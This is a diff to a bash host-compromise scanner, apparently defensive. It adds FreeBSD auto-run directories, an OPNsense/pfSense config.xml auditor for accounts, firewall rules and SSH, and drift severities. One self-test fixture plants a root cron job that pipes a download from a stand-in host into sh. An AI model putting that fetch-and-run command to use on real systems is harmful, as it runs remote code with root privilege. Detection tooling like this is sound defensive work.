@@ -666,7 +666,26 @@ SIG_AUTORUN_DIR='/etc/network/if-up.d
 /etc/cups/interfaces
 /etc/NetworkManager/dispatcher.d
 /etc/NetworkManager/dispatcher.d/pre-up.d
-/etc/NetworkManager/dispatcher.d/pre-down.d'
+/etc/NetworkManager/dispatcher.d/pre-down.d
+/etc/rc.d
+/usr/local/etc/rc.d
+/usr/local/etc/rc.syshook.d
+/usr/local/etc/rc.syshook.d/start
+/usr/local/etc/rc.syshook.d/early
+/usr/local/etc/rc.syshook.d/backup
+/usr/local/etc/rc.syshook.d/monitor
+/etc/periodic/daily
+/etc/periodic/weekly
+/etc/periodic/monthly
+/etc/periodic/security
+/usr/local/etc/periodic/daily
+/usr/local/etc/periodic/weekly
+/usr/local/etc/periodic/monthly
+/usr/local/etc/devd
+/etc/devd
+/etc/ppp/ip-up.d
+/etc/ppp/ip-down.d
+/usr/local/etc/pkg/repos'
 
 # Kernel-mediated command execution. The kernel itself runs the program named
 # in each of these, as root, with no service manager and no log entry. They are
@@ -862,6 +881,9 @@ CAP_ROOT=0 CAP_PROC=0 CAP_FIND_PRINTF=0 CAP_STAT=0 CAP_PS=0
 CAP_SS=0 CAP_NETSTAT=0 CAP_SYSTEMCTL=0 CAP_LSATTR=0 CAP_HASH=""
 CAP_OD=0 CAP_PKGQ=""
 IN_CONTAINER=0 DISTRO_ID="" DISTRO_LIKE=""
+# linux | freebsd. Only ever "freebsd" for an offline --root tree: the script
+# is bash 4 and reads /proc, so it cannot run natively on the appliance.
+TARGET_OS=linux
 
 probe_toolbox() {
     [[ $(id -u 2>/dev/null) == 0 ]] && CAP_ROOT=1
@@ -925,6 +947,17 @@ probe_toolbox() {
         done < "$ROOT/etc/os-release"
         DISTRO_ID=${DISTRO_ID//\"/}
         DISTRO_LIKE=${DISTRO_LIKE//\"/}
+    fi
+
+    # A FreeBSD-derived appliance tree (OPNsense, pfSense) reached through
+    # --root. Detected from the layout rather than from uname, because the
+    # scan runs on a Linux host against a copy of the appliance filesystem.
+    if [[ -n $ROOT ]]; then
+        if [[ -f $ROOT/conf/config.xml || -f $ROOT/cf/conf/config.xml ]] ||
+           { [[ -f $ROOT/etc/master.passwd && -d $ROOT/usr/local/etc/rc.d ]]; }; then
+            TARGET_OS=freebsd
+            [[ -n $DISTRO_ID ]] || DISTRO_ID=freebsd-appliance
+        fi
     fi
 }
 
@@ -3128,6 +3161,248 @@ chk_backdoor_ports() {
     ok BDP000 "$n listeners on the known-backdoor port list; port heuristics are evidence, never a verdict"
 }
 
+
+# ---------------------------------------------------------------------------
+# OPNsense / pfSense configuration
+# ---------------------------------------------------------------------------
+# On these appliances essentially the whole system state - accounts, SSH keys,
+# privileges, firewall and NAT rules, cron, installed packages - lives in one
+# XML file, and every change bumps a <revision>. That makes the file the single
+# highest-value diff target on the box.
+#
+# It does NOT capture changes made from a shell that bypass the configuration:
+# a script dropped in rc.syshook.d, a crontab edited directly, a patched
+# binary. Those are why the filesystem checks run against the tree as well.
+#
+# The format is one tag per line with tab indentation and CDATA sections, so a
+# stack-based reader is exact here without pretending to be an XML parser.
+read -r -d '' OPNCONF_PROG <<'AWKEOF' || true
+BEGIN { OFS = "\t"; depth = 0 }
+
+function leafval(l,   v) {
+    v = l
+    sub(/^[ \t]*<[a-zA-Z0-9_:-]+>/, "", v)
+    sub(/<\/[a-zA-Z0-9_:-]+>[ \t]*$/, "", v)
+    gsub(/<!\[CDATA\[/, "", v)
+    gsub(/\]\]>/, "", v)
+    gsub(/[\t\r\n]/, " ", v)
+    return v
+}
+function path(   i, p) { p = ""; for (i = 1; i <= depth; i++) p = p "/" stack[i]; return p }
+function fin(id, sev, cat, conf, title, target, ev, fix) {
+    print "FIND", id, sev, cat, conf, title, target, ev, fix
+}
+function flushuser(   privs, adminish) {
+    if (u_name == "") return
+    nuser++
+    privs = u_priv
+    print "OBS", "OPNUSER", u_name, "uid=" u_uid " scope=" u_scope " groups=" u_group \
+          " priv=" privs " keys=" (u_keys == "" ? "no" : "yes") \
+          " hash=" (u_hash == "" ? "NONE" : u_hashtype) " expires=" u_expires
+    # A shell-access or full-admin privilege on a router account is the
+    # difference between a web login and a foothold.
+    adminish = (privs ~ /page-all|user-shell-access|user-ssh-access|user-config-readwrite/)
+    if (adminish)
+        fin("OPN010", "INFO", "accounts", "confirmed",
+            "OPNsense account holds administrative or shell privilege",
+            u_name, "priv=" privs " uid=" u_uid "; expected for real admins, diff against the baseline",
+            "review_opn_account")
+    if (u_hash == "")
+        fin("OPN011", "CRIT", "accounts", "confirmed",
+            "OPNsense account has no password hash in the configuration",
+            u_name, "scope=" u_scope " priv=" privs "; verify this account is certificate or key only",
+            "review_opn_account")
+    if (u_keys != "" && adminish)
+        fin("OPN012", "INFO", "accounts", "confirmed",
+            "OPNsense administrative account has authorized SSH keys",
+            u_name, "priv=" privs "; confirm every key is one you placed",
+            "review_opn_account")
+    u_name = ""; u_uid = ""; u_scope = ""; u_group = ""; u_priv = ""
+    u_keys = ""; u_hash = ""; u_hashtype = ""; u_expires = ""
+}
+function flushrule(kind,   permissive) {
+    if (r_seen == 0) return
+    nrule++
+    print "OBS", "OPN" toupper(kind), (r_descr == "" ? "(no description)" : r_descr), \
+          "type=" r_type " iface=" r_iface " proto=" r_proto \
+          " src=" (r_srcany ? "any" : r_src) " dstport=" r_dport \
+          " target=" r_target " localport=" r_lport " disabled=" (r_disabled ? "yes" : "no")
+    permissive = (r_srcany && r_type == "pass" && r_dport == "" && !r_disabled)
+    if (kind == "rule" && permissive && r_iface ~ /wan|WAN/)
+        fin("OPN020", "HIGH", "network", "likely",
+            "Firewall rule passes any source to any port on a WAN interface",
+            (r_descr == "" ? "(no description)" : r_descr),
+            "iface=" r_iface " proto=" r_proto "; confirm this rule is yours",
+            "review_opn_rule")
+    if (kind == "nat" && !r_disabled)
+        fin("OPN021", "INFO", "network", "confirmed",
+            "NAT port forward exposes an internal host",
+            (r_descr == "" ? "(no description)" : r_descr),
+            "iface=" r_iface " proto=" r_proto " dstport=" r_dport \
+            " -> " r_target ":" r_lport "; every forward is an inbound path",
+            "review_opn_rule")
+    r_seen = 0; r_type = ""; r_iface = ""; r_proto = ""; r_src = ""; r_srcany = 0
+    r_dport = ""; r_descr = ""; r_target = ""; r_lport = ""; r_disabled = 0
+}
+function flushcron() {
+    if (c_cmd == "") return
+    ncron++
+    print "OBS", "OPNCRON", c_who "@" c_min " " c_hour " " c_mday " " c_month " " c_wday, c_cmd
+    # Same grammar as a Linux crontab: RULES_PROG scores the command.
+    print "OBS", "CRON", "config.xml:" c_who, c_cmd
+    c_min = ""; c_hour = ""; c_mday = ""; c_month = ""; c_wday = ""; c_who = ""; c_cmd = ""
+}
+
+/^[ \t]*<\?xml/ { next }
+
+# closing tag on its own line
+/^[ \t]*<\/[a-zA-Z0-9_:-]+>[ \t]*$/ {
+    tag = $0; sub(/^[ \t]*<\//, "", tag); sub(/>[ \t]*$/, "", tag)
+    if (tag == "user") flushuser()
+    else if (tag == "item" && path() ~ /\/cron\/item$/) flushcron()
+    else if (tag == "rule") { if (path() ~ /\/nat\/rule$/) flushrule("nat"); else flushrule("rule") }
+    if (depth > 0) depth--
+    next
+}
+
+# leaf: <tag>value</tag>
+/^[ \t]*<[a-zA-Z0-9_:-]+>.*<\/[a-zA-Z0-9_:-]+>[ \t]*$/ {
+    tag = $0; sub(/^[ \t]*</, "", tag); sub(/>.*$/, "", tag)
+    v = leafval($0)
+    p = path() "/" tag
+    if (p ~ /\/system\/user\//) {
+        if (tag == "name") u_name = v
+        else if (tag == "uid") u_uid = v
+        else if (tag == "scope") u_scope = v
+        else if (tag == "groupname") u_group = v
+        else if (tag == "priv") u_priv = (u_priv == "" ? v : u_priv "," v)
+        else if (tag == "authorizedkeys") u_keys = v
+        else if (tag == "expires") u_expires = v
+        else if (tag ~ /-hash$/) { u_hash = v; u_hashtype = tag }
+        next
+    }
+    if (p ~ /\/system\/group\//) {
+        if (tag == "name") g_name = v
+        else if (tag == "gid") g_gid = v
+        else if (tag == "member") g_member = (g_member == "" ? v : g_member "," v)
+        else if (tag == "priv") g_priv = (g_priv == "" ? v : g_priv "," v)
+        next
+    }
+    if (p ~ /\/cron\/item\//) {
+        if (tag == "minute") c_min = v
+        else if (tag == "hour") c_hour = v
+        else if (tag == "mday") c_mday = v
+        else if (tag == "month") c_month = v
+        else if (tag == "wday") c_wday = v
+        else if (tag == "who") c_who = v
+        else if (tag == "command") c_cmd = v
+        next
+    }
+    if (p ~ /\/rule\//) {
+        r_seen = 1
+        if (tag == "type") r_type = v
+        else if (tag == "interface") r_iface = v
+        else if (tag == "protocol") r_proto = v
+        else if (tag == "descr") r_descr = v
+        else if (tag == "target") r_target = v
+        else if (tag == "local-port") r_lport = v
+        else if (tag == "disabled") r_disabled = 1
+        else if (tag == "port" && path() ~ /destination$/) r_dport = v
+        else if (tag == "any" && path() ~ /source$/) r_srcany = 1
+        next
+    }
+    if (p ~ /\/installedpackages\/package\/name$/) {
+        npkg++
+        print "OBS", "OPNPKG", v, "installed"
+        next
+    }
+    if (p ~ /\/revision\//) {
+        if (tag == "time") rev_time = v
+        else if (tag == "username") rev_user = v
+        else if (tag == "description") rev_desc = v
+        next
+    }
+    # Security-relevant scalars worth a named observation and a diff.
+    if (tag == "enablesshd" || tag == "sshdkeyonly" || tag == "permitrootlogin" ||
+        tag == "sshdpermitrootlogin" || tag == "port" && path() ~ /\/system\/ssh$/ ||
+        tag == "protocol" && path() ~ /webgui$/ || tag == "disablehttpredirect" ||
+        tag == "nodnsrebindcheck" || tag == "disableconsolemenu" ||
+        tag == "sshdport" || tag == "hostname" || tag == "domain") {
+        print "OBS", "OPNSYS", substr(path() "/" tag, 2), v
+        if (tag == "sshdkeyonly" && v == "")
+            fin("OPN030", "MED", "ssh", "possible",
+                "OPNsense SSH permits password authentication", "config.xml",
+                "sshdkeyonly is unset; key-only access removes password guessing entirely",
+                "review_opn_ssh")
+        if ((tag == "permitrootlogin" || tag == "sshdpermitrootlogin") && v != "")
+            fin("OPN031", "HIGH", "ssh", "confirmed",
+                "OPNsense SSH permits root login", "config.xml",
+                tag "=" v, "review_opn_ssh")
+        next
+    }
+    next
+}
+
+# opening tag on its own line
+/^[ \t]*<[a-zA-Z0-9_:-]+>[ \t]*$/ {
+    tag = $0; sub(/^[ \t]*</, "", tag); sub(/>[ \t]*$/, "", tag)
+    depth++; stack[depth] = tag
+    next
+}
+
+# self-closing, e.g. <any/>
+/^[ \t]*<[a-zA-Z0-9_:-]+\/>[ \t]*$/ {
+    tag = $0; sub(/^[ \t]*</, "", tag); sub(/\/>[ \t]*$/, "", tag)
+    if (path() ~ /\/rule\/source$/ && tag == "any") { r_seen = 1; r_srcany = 1 }
+    next
+}
+
+END {
+    flushuser(); flushcron(); flushrule("rule")
+    print "OBS", "OPNREV", rev_time, rev_user " " rev_desc
+    print "OK", "OPN001", nuser " accounts, " nrule " filter/NAT rules, " ncron \
+          " cron items and " npkg " packages read from config.xml; last change " \
+          rev_time " by " rev_user
+}
+AWKEOF
+
+# --- M33: OPNsense / pfSense configuration ----------------------------------
+chk_opnsense() {
+    local f found=0 c
+    local -a configs=()
+    for f in "$ROOT/conf/config.xml" "$ROOT/cf/conf/config.xml"; do
+        [[ -f $f && -r $f ]] && { configs+=("$f"); found=1; }
+    done
+    if (( found == 0 )); then
+        if [[ $TARGET_OS == freebsd ]]; then
+            skip OPN000 "FreeBSD appliance tree detected but no readable /conf/config.xml; router configuration UNKNOWN"
+        else
+            ok OPN000 "not an OPNsense/pfSense target; router configuration check not applicable"
+        fi
+        return
+    fi
+    for f in "${configs[@]}"; do
+        logical_path "$f"
+        run_bounded 10 awk "$OPNCONF_PROG" "$f" || skip OPN000 "config.xml parse failed or exceeded budget: $LOGICAL"
+    done
+
+    # The backup directory is a free timeline: each file is a prior revision,
+    # so their count and timestamps show when the box was last reconfigured.
+    local n=0
+    for c in "$ROOT"/conf/backup/config-*.xml "$ROOT"/cf/conf/backup/config-*.xml; do
+        [[ -f $c ]] || continue
+        n=$((n + 1))
+    done
+    (( n > 0 )) && {
+        logical_path "$c"
+        obs OPNBACKUP "${LOGICAL%/*}" "$n prior configuration revisions retained"
+    }
+    # The detailed counts come from OPN001, emitted by the awk stage downstream
+    # of run_check. This check must still declare a verdict of its own or it is
+    # reported as a broken check on every appliance.
+    ok OPN000 "${#configs[@]} appliance configuration file(s) parsed; $n retained prior revisions"
+}
+
 # ---------------------------------------------------------------------------
 # driver
 # ---------------------------------------------------------------------------
@@ -3139,7 +3414,7 @@ chk_hardening chk_services chk_packages chk_hunt chk_extra_procs chk_sessions
 chk_capabilities chk_weak_passwords chk_artifacts chk_agent_enrollment chk_ssh_locations chk_privilege_paths chk_container_surface chk_acl chk_stored_credentials chk_package_inventory chk_host_inventory chk_process_mappings chk_session_sockets chk_auth_events
 chk_provenance chk_unowned_listener chk_outbound chk_binfmt chk_elfscan
 chk_kernel_exec chk_autorun_dirs chk_tcpwrappers chk_ssh_client chk_ebpf
-chk_hidden_system chk_miner chk_backdoor_ports"
+chk_hidden_system chk_miner chk_backdoor_ports chk_opnsense"
 
 collect_all() {
     local host when os kern priv
@@ -3171,6 +3446,7 @@ collect_all() {
     meta container "$IN_CONTAINER"
     meta root "${ROOT:-/}"
     meta trust "kernel observations plus untrusted userland tools; shell/interpreter may also be tampered"
+    meta target_os "$TARGET_OS"
     meta caps "proc=$CAP_PROC printf=$CAP_FIND_PRINTF stat=$CAP_STAT ps=$CAP_PS hash=${CAP_HASH:-none} od=$CAP_OD pkgq=${CAP_PKGQ:-none}"
 
     col_proc
@@ -3572,11 +3848,38 @@ selftest_sandbox() (
     rm -rf -- "$ROOT/proc/sys" "$ROOT/sys" "$ROOT/etc/network" "$ROOT/etc/hosts.allow" \
               "$ROOT/etc/systemd/system-sleep" "$ROOT/etc/ssh" "$ROOT/usr" "$ROOT/etc/sysctl.d"
 
+    # --- OPNsense / pfSense appliance tree -------------------------------
+    mkdir -p "$ROOT/conf"
+    printf '%b\n' '<?xml version="1.0"?>' '<pfsense>' '\t<system>' \
+        '\t\t<user>' '\t\t\t<name>admin</name>' '\t\t\t<scope>system</scope>' \
+        '\t\t\t<uid>0</uid>' '\t\t\t<sha512-hash>REDACTED</sha512-hash>' \
+        '\t\t\t<priv>page-all</priv>' '\t\t</user>' '\t</system>' \
+        '\t<cron>' '\t\t<item>' '\t\t\t<who>root</who>' \
+        '\t\t\t<command>/usr/local/sbin/ping_hosts.sh</command>' '\t\t</item>' '\t</cron>' \
+        '\t<revision>' '\t\t<time>1700000000</time>' '\t\t<username>admin</username>' \
+        '\t</revision>' '</pfsense>' > "$ROOT/conf/config.xml"
+    result=$(run_check chk_opnsense | awk -F '\t' '$1=="FIND" && $3!="INFO"{print $2}')
+    selftest_assert clean-opnsense "$result" ''
+    result=$(run_check chk_opnsense | awk -F '\t' '$1=="OBS" && $2=="OPNUSER"{print $3}')
+    selftest_assert opnsense-user-parsed "$result" admin
+    # A cron command from config.xml must be scored by the same grammar as a
+    # Linux crontab, not a second one written for the appliance.
+    printf '%b\n' '<?xml version="1.0"?>' '<pfsense>' '\t<system>' \
+        '\t\t<user>' '\t\t\t<name>svc_backup</name>' '\t\t\t<scope>user</scope>' \
+        '\t\t\t<uid>2001</uid>' '\t\t\t<priv>user-shell-access</priv>' \
+        '\t\t</user>' '\t</system>' \
+        '\t<cron>' '\t\t<item>' '\t\t\t<who>root</who>' \
+        '\t\t\t<command>curl https://example.invalid/fixture | sh</command>' \
+        '\t\t</item>' '\t</cron>' '</pfsense>' > "$ROOT/conf/config.xml"
+    result=$({ run_check chk_opnsense; } | awk "$RULES_PROG" | awk -F '\t' '$1=="FIND"{print $2}' | sort -u | tr '\n' ' ')
+    selftest_assert opnsense-backdoor-account-and-cron "$result" 'OPN010 OPN011 PER001 '
+    rm -rf -- "$ROOT/conf"
+
     mkdir -p "$ROOT/proc/net"
     printf 'sl local_address rem_address st tx_queue rx tr tm retr uid timeout inode\n 0: 0100007F:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 123 1\n' > "$ROOT/proc/net/tcp"
     LISTEN_ROWS=(); col_net >/dev/null
     selftest_assert proc-listener "${LISTEN_ROWS[0]:-missing}" 'tcp|127.0.0.1|22|0|123'
-    printf 'Sandbox tests: %d failures; coverage: accounts, keys, preload, cron, systemd, binfmt_misc, kernel exec handlers, auto-run hooks, TCP wrappers, SSH client, eBPF, hidden system files.\n' "$TEST_FAILURES"
+    printf 'Sandbox tests: %d failures; coverage: accounts, keys, preload, cron, systemd, binfmt_misc, kernel exec handlers, auto-run hooks, TCP wrappers, SSH client, eBPF, hidden system files, OPNsense config.xml.\n' "$TEST_FAILURES"
     printf 'Environment-gated: live hidden PID/socket/module attacks, ftrace, immutable enforcement, firewall/MAC and package verification; not simulated here.\n'
     printf 'Also environment-gated: package-ownership provenance (needs a real dpkg/rpm database) and the listener/outbound scores built on it; ELF_PROG is covered by --selftest unit instead.\n'
     (( TEST_FAILURES == 0 )) || return 4
@@ -4198,10 +4501,12 @@ $1=="FIND" || $1=="OK" {if(keep) print; next}
 $1!="OBS" {next}
 {
     t=$2; k=$3; v=$4
-    if(t ~ /^(FILE|SUID|USER|SSHKEY|LISTEN|MOD|SYSCTL|IFACE|MOUNT|AGENT|SERVICE|SSHD|MAC|KERNEL|STARTUP_FILE|GROUP|SHADOW_META|PKG|CONTROL_SOCKET|AGENT_CONFIG)$/) {
+    if(t ~ /^(FILE|SUID|USER|SSHKEY|LISTEN|MOD|SYSCTL|IFACE|MOUNT|AGENT|SERVICE|SSHD|MAC|KERNEL|STARTUP_FILE|GROUP|SHADOW_META|PKG|CONTROL_SOCKET|AGENT_CONFIG)$/ ||
+       t ~ /^(PROVENANCE|BINFMT|KERNELEXEC|BPFPIN|BPFPROG|HIDDENSYS|AUTORUN|OPNUSER|OPNSYS|OPNREV|OPNPKG|OPNBACKUP)$/) {
         if(t=="AGENT") sub(/:[0-9]+$/,"",v)
         if(t=="LISTEN") {sub(/pid=[0-9]+ /,"",v)}
-    } else if(t ~ /^(CRON|UNITEXEC|UNITCFG|UNITTIMER|RCLINE|CONFIG|SUDOERS)$/) {
+    } else if(t ~ /^(CRON|UNITEXEC|UNITCFG|UNITTIMER|RCLINE|CONFIG|SUDOERS)$/ ||
+              t ~ /^(SYSCTLEXEC|TCPWRAP|SSHCLIENT|TRACEPROBE|BINFMTD|OPNCRON|OPNRULE|OPNNAT)$/) {
         # Stable content identity avoids dropping multiple lines with one key.
         if(root!="/" && root!="" && index(k,root)==1) k=substr(k,length(root)+1)
         k=k "|" v; v="present"
@@ -4226,6 +4531,12 @@ function drift(action,t,k,b,c,  sev,old,new) {
     sev="MED"
     if(action=="ADDED" && t ~ /^(SUID|SSHKEY|MOD|USER|CRON)$/) sev="CRIT"
     if(action=="ADDED" && t ~ /^(LISTEN|UNITEXEC|UNITCFG|CONFIG|RCLINE)$/) sev="HIGH"
+    # Nothing legitimately adds a kernel exec handler, a BPF pin, a tracing
+    # probe, an interpreter registration, a hidden system file or a router
+    # account while the host is running.
+    if(action=="ADDED" && t ~ /^(KERNELEXEC|BPFPIN|TRACEPROBE|BINFMT|HIDDENSYS|OPNUSER|TCPWRAP)$/) sev="CRIT"
+    if(action=="CHANGED" && t ~ /^(KERNELEXEC|OPNUSER|OPNSYS|BINFMT)$/) sev="CRIT"
+    if(action=="ADDED" && t ~ /^(AUTORUN|SSHCLIENT|SYSCTLEXEC|BINFMTD|OPNRULE|OPNNAT|OPNPKG|PROVENANCE)$/) sev="HIGH"
     if(action=="CHANGED" && t=="FILE" && k ~ /^\/(etc\/(passwd|shadow|sudoers|ld.so.preload)|usr\/(bin|sbin)\/|bin\/|sbin\/)/) sev="CRIT"
     if(action=="CHANGED" && t=="FILE") {
         split(b,old,":"); split(c,new,":")
@@ -4605,7 +4916,7 @@ selftest_lint() (
     local failures=0 source=${BASH_SOURCE[0]}
     bash -n "$source" || failures=$((failures+1))
     # Check only actual awk program contents; names in prose are harmless.
-    printf '%s\n' "$RULES_PROG" "$RENDER_PROG" "$CONFIG_RULES" "$WEBSHELL_PROG" "$SNAPSHOT_PROG" "$DIFF_PROG" "$JSON_PROG" "$ELF_PROG" |
+    printf '%s\n' "$RULES_PROG" "$RENDER_PROG" "$CONFIG_RULES" "$WEBSHELL_PROG" "$SNAPSHOT_PROG" "$DIFF_PROG" "$JSON_PROG" "$ELF_PROG" "$OPNCONF_PROG" |
         awk '/(^|[^[:alnum:]_])(gensub|strtonum|asort|asorti)[ \t]*\(|ENDFILE|BEGINFILE/ {bad=1} END{exit bad}' || failures=$((failures+1))
     LC_ALL=C awk '/[^\t\r\040-\176]/ {print "Non-ASCII source line " NR; bad=1} END {exit bad}' "$source" || failures=$((failures+1))
     printf 'Lint: %d failures; shellcheck and distro integration are separate checks.\n' "$failures"
